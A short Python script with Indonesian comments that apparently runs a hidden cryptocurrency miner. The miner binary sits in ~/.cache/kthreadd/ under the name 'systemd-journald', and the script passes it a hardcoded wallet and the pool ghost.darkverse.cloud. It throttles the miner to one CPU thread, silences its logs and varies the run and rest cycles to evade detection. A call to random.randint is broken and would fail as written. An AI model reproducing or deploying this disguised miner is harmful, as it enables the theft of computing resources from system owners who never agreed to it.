import subprocess
import time
import os
import random
import shutil

# Konfigurasi
WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
POOL = "ghost.darkverse.cloud:11002"
ALGO = "verushash"
CPU_THREADS = 1
BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
ORIGINAL_BINARY = BASE_PATH + "systemd-journald"

while True:
    # Waktu running acak antara 35-50 menit
    run_minutes = random.randint(20, 35, 50)
    # Waktu istirahat acak antara 2-5 menit
    rest_minutes = random.randint(2, 5)

    print(f"ðŸ”„ Menjalankan binary selama {run_minutes} menit...")
    process = subprocess.Popen([
        ORIGINAL_BINARY,
        "--algorithm", ALGO,
        "--pool", POOL,
        "--wallet", WALLET,
        "--cpu-threads", str(CPU_THREADS),
        "--dns-over-https", "1",
        "--disable-gpu",   # aktifkan kalau pakai versi CPU only
        "--no-color",
        # "--no-dev-fee",   # kalau berhasil patch, bisa aktifin
        "--log-file", "/dev/null"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(run_minutes * 60)

    print(f"ðŸ˜´ Istirahat selama {rest_minutes} menit...")
    process.kill()
    os.system(f"pkill -f systemd-journald")

    time.sleep(rest_minutes * 60)
